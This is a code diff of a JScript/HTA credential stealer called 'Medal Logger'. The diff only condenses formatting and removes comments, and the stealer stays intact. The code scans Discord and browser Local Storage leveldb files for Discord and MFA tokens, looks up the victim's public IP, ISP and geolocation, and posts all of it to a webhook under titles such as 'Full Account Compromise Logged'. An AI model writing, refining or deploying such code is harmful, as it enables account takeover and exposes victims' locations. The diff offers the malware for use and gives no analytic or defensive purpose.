@@ -25,9 +25,7 @@
                 xhr.open("POST", webhookUrl, false);
                 xhr.setRequestHeader('Content-Type', 'application/json');
                 xhr.send(JSON.stringify(payload));
-            } catch (e) {
-                // Fails silently. The target learns nothing.
-            }
+            } catch (e) {}
         }
 
         function getPublicIntel() {
@@ -37,12 +35,8 @@
                 xhr.send();
                 var data = eval('(' + xhr.responseText + ')');
                 return {
-                    ip: data.ip || "N/A",
-                    city: data.city || "N/A",
-                    region: data.region || "N/A",
-                    country: data.country || "N/A",
-                    org: data.org || "N/A",
-                    loc: data.loc || "N/A"
+                    ip: data.ip || "N/A", city: data.city || "N/A", region: data.region || "N/A",
+                    country: data.country || "N/A", org: data.org || "N/A", loc: data.loc || "N/A"
                 };
             } catch (e) {
                 return { ip: "N/A", city: "N/A", region: "N/A", country: "N/A", org: "N/A", loc: "N/A" };
@@ -54,7 +48,6 @@
             var fso = new ActiveXObject("Scripting.FileSystemObject");
             var appData = shell.ExpandEnvironmentStrings("%APPDATA%");
             var localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%");
-            
             var paths = {
                 'Discord': appData + '\\discord\\Local Storage\\leveldb\\',
                 'Discord Canary': appData + '\\discordcanary\\Local Storage\\leveldb\\',
@@ -65,43 +58,26 @@
                 'Opera': appData + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                 'Opera GX': appData + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\'
             };
-
             var foundTokens = [];
             var tokenRegex = new RegExp("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}", "g");
             var mfaRegex = new RegExp("mfa\\.[\\w-]{84}", "g");
-
             for (var name in paths) {
-                var path = paths[name];
-                if (!fso.FolderExists(path)) continue;
-
-                var folder = fso.GetFolder(path);
+                if (!fso.FolderExists(paths[name])) continue;
+                var folder = fso.GetFolder(paths[name]);
                 var files = new Enumerator(folder.Files);
                 for (; !files.atEnd(); files.moveNext()) {
                     var file = files.item();
                     if (file.Name.substr(file.Name.length - 4) === ".log" || file.Name.substr(file.Name.length - 4) === ".ldb") {
                         try {
-                            var stream = file.OpenAsTextStream(1, -2);
-                            var content = stream.ReadAll();
-                            stream.Close();
-                            
-                            var allMatches = content.match(tokenRegex) || [];
-                            var mfaMatches = content.match(mfaRegex) || [];
+                            var stream = file.OpenAsTextStream(1, -2); var content = stream.ReadAll(); stream.Close();
+                            var allMatches = content.match(tokenRegex) || []; var mfaMatches = content.match(mfaRegex) || [];
                             var combinedMatches = allMatches.concat(mfaMatches);
-
                             for (var i = 0; i < combinedMatches.length; i++) {
-                                var token = combinedMatches[i];
-                                var isPresent = false;
-                                for (var j = 0; j < foundTokens.length; j++) {
-                                    if (foundTokens[j] === token) {
-                                        isPresent = true;
-                                        break;
-                                    }
-                                }
-                                if (!isPresent) {
-                                    foundTokens.push(token);
-                                }
+                                var token = combinedMatches[i]; var isPresent = false;
+                                for (var j = 0; j < foundTokens.length; j++) { if (foundTokens[j] === token) { isPresent = true; break; } }
+                                if (!isPresent) { foundTokens.push(token); }
                             }
-                        } catch (e) { /* Ignore read errors on locked files */ }
+                        } catch (e) {}
                     }
                 }
             }
@@ -110,49 +86,27 @@
 
         var publicIntel = getPublicIntel();
         var tokens = findTokens();
-        
         var gmapsLink = publicIntel.loc !== "N/A" ? "https://www.google.com/maps?q=" + publicIntel.loc : "Coordinates unavailable";
-
         var tokenFields = [];
-        for (var i = 0; i < tokens.length; i++) {
-            tokenFields.push({
-                name: "🔑 Token #" + (i + 1),
-                value: "```" + tokens[i] + "```",
-                inline: false
-            });
-        }
-        
-        var description = "**Timestamp:** `" + new Date().toISOString() + "`\n";
-        description += "**Total Tokens Found:** `" + tokens.length + "`\n\n";
-
-        if (tokens.length === 0) {
-            description += "No Discord tokens found. Target is clean, not logged in, or uses browser only.";
-        }
-
+        for (var i = 0; i < tokens.length; i++) { tokenFields.push({ name: "🔑 Token #" + (i + 1), value: "```" + tokens[i] + "```", inline: false }); }
+        var description = "**Timestamp:** `" + new Date().toISOString() + "`\n**Total Tokens Found:** `" + tokens.length + "`\n\n";
+        if (tokens.length === 0) { description += "No Discord tokens found."; }
         var payload = {
-            username: "Medal Logger",
-            avatar_url: "https://cdn.aptoide.com/imgs/9/e/0/9e094c5ef07f2e5bcd5ec3c60bf7669c_icon.png",
+            username: "Medal Logger", avatar_url: "https://cdn.aptoide.com/imgs/9/e/0/9e094c5ef07f2e5bcd5ec3c60bf7669c_icon.png",
             embeds: [{
-                title: "Scepter Acquired: Full Account Compromise Logged",
-                description: description,
-                color: 9699539,
+                title: "Scepter Acquired: Full Account Compromise Logged", description: description, color: 9699539,
                 fields: [
                     { name: "🌐 Public IP", value: "`" + publicIntel.ip + "`", inline: true },
                     { name: "🏢 ISP / Org", value: "*" + publicIntel.org + "*", inline: true },
                     { name: "📍 Geolocation", value: publicIntel.city + ", " + publicIntel.region + ", " + publicIntel.country, inline: false },
                     { name: "🗺️ Map View", value: gmapsLink !== "N/A" ? "[Click to View Approximate Location](" + gmapsLink + ")" : "Coordinates unavailable", inline: false}
                 ].concat(tokenFields),
-                footer: {
-                    text: "Medal Logger // KINGDOM CAPTURED"
-                }
+                footer: { text: "Medal Logger // KINGDOM CAPTURED" }
             }]
         };
-
         postToWebhook(payload);
-        
         self.close();
     }
-
     main();
 </script>
 </body>
